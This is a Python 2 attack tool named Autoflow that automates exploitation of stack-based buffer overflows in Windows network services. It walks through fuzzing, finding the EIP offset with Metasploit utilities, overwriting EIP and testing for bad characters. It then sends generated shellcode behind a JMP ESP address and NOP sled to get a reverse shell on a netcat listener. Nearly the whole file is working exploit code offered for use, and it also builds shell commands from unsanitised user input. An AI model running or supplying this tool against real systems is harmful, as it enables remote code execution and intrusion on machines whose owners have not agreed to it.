#!/usr/bin/python
# Autoflow 1.0 : Windows Stack Based Auto Buffer Overflow Exploiter.
# Author - Himanshu Shukla (etc5had0w)
# Version -1.0
# Make sure all dependencies are installed before running this program.
# Report any errors or issues found to the github page directly.
# Note - Copying, Modifying or Reproducing this code is not allowed without prior permission of the owner of this program.

import socket, time, sys, subprocess, os

RESET = '\033[m' # reset to the defaults
BackgroundBlack = "\033[40m"
Black        = "\033[30m"
Red          = "\033[31m"
Green        = "\033[32m"
Yellow       = "\033[33m"
Blue         = "\033[34m"
Magenta      = "\033[35m"
Cyan         = "\033[36m"
LightGray    = "\033[37m"
DarkGray     = "\033[90m"
LightRed     = "\033[91m"
LightGreen   = "\033[92m"
LightYellow  = "\033[93m"
LightBlue    = "\033[94m"
LightMagenta = "\033[95m"
LightCyan    = "\033[96m"
White        = "\033[97m"
Blink      = "\033[5m"
BOLD = '\033[1m'


def banner():


	print BOLD+Cyan+Blink+"\n    HHHH"+RESET
	print BOLD+Yellow+"      HHHH"
	print BOLD+Green+"      HHHH"+RESET+Yellow+BOLD+"            Windows Stack Based"+RESET
	print BOLD+Blue+"      HHHH"+RESET+Yellow+BOLD+"       Auto Buffer Overflow Exploiter"+RESET
	print BOLD+Red+"      HHHH"+RESET
                                                                                
	print BOLD+Blue+"     ___   __  ____________  ________    ____ _       __"
	print BOLD+LightBlue+"    /   | / / / /_  __/ __ \/ ____/ /   / __ \ |     / /"
	print BOLD+Cyan+"   / /| |/ / / / / / / / / / /_  / /   / / / / | /| / / "
	print BOLD+LightCyan+"  / ___ / /_/ / / / / /_/ / __/ / /___/ /_/ /| |/ |/ /  "
	print BOLD+LightCyan+" /_/  |_\____/ /_/  \____/_/   /_____/\____/ |__/|__/   \n"+RESET
	print BOLD+Yellow+"         /--------------------------"+RESET
	print BOLD+Yellow+" --------> Author - Himanshu Shukla"+RESET
	print BOLD+Yellow+"         \--------------------------\n"+RESET
	time.sleep(0.5)


banner()
host=raw_input(BOLD+LightBlue+"[*] Enter The IP Address of host you want to exploit "+Blink+": "+RESET)
port=input(BOLD+LightBlue+"[*] Enter The Port number of host you want to exploit "+Blink+": "+RESET)
vulncmd=raw_input(BOLD+LightBlue+"[*] Enter The Buffer Overflow Vulnarable Command "+Blink+": "+RESET)


def conntest():

#testing if we can connect to host or not.
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5)
		s.connect((host, port))
		s.recv(1024)
		s.close()
		print(BOLD+Green+"[+] Connection Successful with Host: "+host+" Port: "+str(port)+RESET)
		time.sleep(2)		
	except:
		print(BOLD+Red+"[-] Connection Failed with Host: "+host+" Port: "+str(port)+RESET)	
		sys.exit(0)


def fuzzer():

#Configuring Buffer data.
	buffer = []
	incr=100
	while len(buffer) < 30:
		buffer.append("A" * incr)
		incr += 100

	conntest
#Performing Fuzzing.
	vals=0
	for i in buffer:
		try:
			
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(5)
			#Connecting To The Host.
			s.connect((host, port))
			s.recv(1024)
			os.system("clear")
			banner()
			print(BOLD+Cyan+"[+] Fuzzing With "+str(len(i))+" Bytes of data."+RESET)
			s.send(vulncmd+" "+i+"\n")
			s.recv(1024)
			s.close()

		except:
			print(BOLD+Green+"[+] Fuzzing Crashed at "+str(len(i))+" Bytes of data." +RESET)
			time.sleep(0.5)
			fuzzer.vals=len(i)+400
			print(BOLD+Yellow+"[*] The Vulnarable Program is at Crashed State."+RESET)
			time.sleep(0.5)
			print(BOLD+Yellow+"[*] Run The Vulnarable Program Again & Load it in Your Debugger Program."+RESET)
			time.sleep(0.5)
			raw_input(BOLD+Yellow+"[*] Hit Enter When Done."+RESET)
			break


def findoffset():
	os.system("clear")
	banner()
	time.sleep(0.5)
	print(BOLD+Cyan+"[+] Generating Pattern Using Metasploit's pattern_create.rb Utility..."+RESET)
	patt=subprocess.check_output("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l "+str(fuzzer.vals), shell=True)
	time.sleep(0.5)
	print(BOLD+Green+"[+] Pattern Generated Successfully!"+RESET)

	conntest()

	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		time.sleep(0.5)
		print(BOLD+Cyan+"[+] Sending The Generated Custom Pattern Buffer..."+RESET)
		time.sleep(0.5)
		s.send(vulncmd + " " + patt + "\n")
		print(BOLD+Green+"[+] Buffer Sent Successfully!"+RESET)
	except:
		time.sleep(0.5)
		print(BOLD+Red+"[-] Failed to Send The Buffer!"+RESET)
	
	time.sleep(0.5)
	offsetval=raw_input(BOLD+LightBlue+"Check Your Debugger and Input The Value of EIP Register "+Blink+": "+RESET)
	time.sleep(0.5)
	print(BOLD+Cyan+"[+] Matching The Offset Value..."+RESET)

	findoffset.offset=subprocess.check_output("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l "+str(fuzzer.vals)+" -q "+str(offsetval)+" | awk '{print $6}' ", shell=True)
	time.sleep(0.5)
	print(BOLD+Green+"[+] Exact Match At Offset "+str(findoffset.offset)+RESET)
	time.sleep(0.5)
	print(BOLD+Yellow+"[*] The Vulnarable Program is at Crashed State."+RESET)
	time.sleep(0.5)
	print(BOLD+Yellow+"[*] Run The Vulnarable Program Again & Load it in Your Debugger Program."+RESET)
	time.sleep(0.5)
	raw_input(BOLD+Yellow+"[*] Hit Enter When Done."+RESET)
	

def overwriteEIP():

	os.system("clear")
	banner()
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		time.sleep(0.5)
		print(BOLD+Cyan+"[+] Trying To Overwrite The EIP Register..."+RESET)
		time.sleep(0.5)
		bufft="A"*int(findoffset.offset)+"B"*4
		s.send(vulncmd + " " + bufft + "\n")
		print(BOLD+Yellow+"[*] Check The Value of EIP Register in Your Debugger Program. "+RESET)
		time.sleep(0.5)
		print(BOLD+Yellow+"[*] Make Sure The Value Matches to 42424242"+RESET)
		time.sleep(0.5)
		match=raw_input(BOLD+LightBlue+"[*] Is The Value Matching? (Y/N) "+RESET)
		time.sleep(0.5)
		if match=="Y" or match=="y":
			print(BOLD+Green+"[+] EIP Overwritten Successfully!"+RESET)
			time.sleep(0.5)
			print(BOLD+Yellow+"[*] The Vulnarable Program is at Crashed State."+RESET)
			time.sleep(0.5)
			print(BOLD+Yellow+"[*] Run The Vulnarable Program Again & Load it in Your Debugger Program."+RESET)
			raw_input(BOLD+Yellow+"[*] Hit Enter When Done."+RESET)

		else:
			print(BOLD+Red+"[-] Something Went Wrong!"+RESET)
			time.sleep(0.5)
			print(BOLD+Red+"[*] Re-run Autoflow with correct values!"+RESET)
			exit()
	
	except:
		print(BOLD+Red+"[-] Failed to Overwrite The EIP Register!"+RESET)
		exit()



def exploit():

	os.system("clear")
	banner()

	badchar = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		time.sleep(0.5)
		print(BOLD+Cyan+"[+] Bad Character Test on Progress..."+RESET)
		time.sleep(0.5)
		bufft="A"*int(findoffset.offset)+"B"*4
		s.send(vulncmd + " " + bufft + badchar + "\n")
		print(BOLD+Green+"[+] Buffer Sent Successfully!"+RESET)
		time.sleep(0.5)
		print(BOLD+Yellow+"[*] Take Your Time & Determine All The Bad Characters."+RESET)
		time.sleep(0.5)
		raw_input(BOLD+Yellow+"[*] Hit Enter When Done."+RESET)



	except:
		print(BOLD+Red+"[-] Bad Character Test Failed!"+RESET) 


	os.system("clear")
	banner()
	print(BOLD+Yellow+"[*] The Vulnarable Program is at Crashed State."+RESET)
	time.sleep(0.5)
	print(BOLD+Yellow+"[*] Run The Vulnarable Program Again & Load it in Your Debugger Program."+RESET)
	time.sleep(0.5)
	raw_input(BOLD+Yellow+"[*] Hit Enter When Done."+RESET)
	time.sleep(0.5)
	os.system("clear")
	banner()
	bch=raw_input(BOLD+LightBlue+"[*] Enter All The Bad Characters Found :  "+RESET)	
	lhost=raw_input(BOLD+LightBlue+"[*] Enter The LHOST you want to use in payload :  "+RESET)
	lport=raw_input(BOLD+LightBlue+"[*] Enter The LPORT you want to use in payload :  "+RESET)
	time.sleep(0.5)
	print(BOLD+Yellow+"[+] Setup Your Netcat Listener With This Commnad : nc -lvnp "+lport+RESET)
	time.sleep(0.5)
	raw_input(BOLD+Yellow+"[*] Hit Enter When Done."+RESET)

	os.system("clear")
	banner()

	time.sleep(0.5)
	print(BOLD+Cyan+"[+] Generating The Payload..."+RESET)
	subprocess.check_output("./payloader.sh "+lhost+" "+lport+" "+'"'+bch+'"', shell=True)
	os.system("clear")
	banner()
	print(BOLD+Green+"[+] Payload Generated Successfully!"+RESET)
	time.sleep(0.5)
	jmpesp=raw_input(BOLD+LightBlue+"[*] Enter The JMP ESP Address in Reverse Order :  "+RESET)
	subprocess.check_output("./espconvert.sh "+'"'+jmpesp+'"', shell=True)
	time.sleep(0.5)

	os.system("clear")
	banner()
	try:
			import payload
			import esp
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			print(BOLD+Cyan+"[+] Sending Final Exploit Code..."+RESET)
			time.sleep(0.5)
			finalbuffer="A"*int(findoffset.offset)
			padding = "\x90" * 16
			fpld=vulncmd + " " + finalbuffer + esp.espa + padding + payload.buf
			s.send(fpld)
			print(BOLD+Green+"[+] Final Buffer Sent Successfully!"+RESET)
			time.sleep(0.5)
			print(BOLD+Yellow+"[*] Check Your Netcat Listener For Reverse Shell. "+RESET)
			print(BOLD+Yellow+"[*] Note : If There is no reverse shell spawned that means some or all input values are incorrect. "+RESET)
			print(BOLD+Yellow+"[*] In this case re-run Autoflow with correct values. "+RESET)


	except:
			print(BOLD+Red+"[-] Failed to Send The Final Exploit!"+RESET) 
			time.sleep(0.5)
			print(BOLD+Yellow+"[*] Cross Verify Your Input Values & Try Again."+RESET)
			exit()



if __name__ == "__main__":

	fuzzer()
	findoffset()
	overwriteEIP()
	exploit()


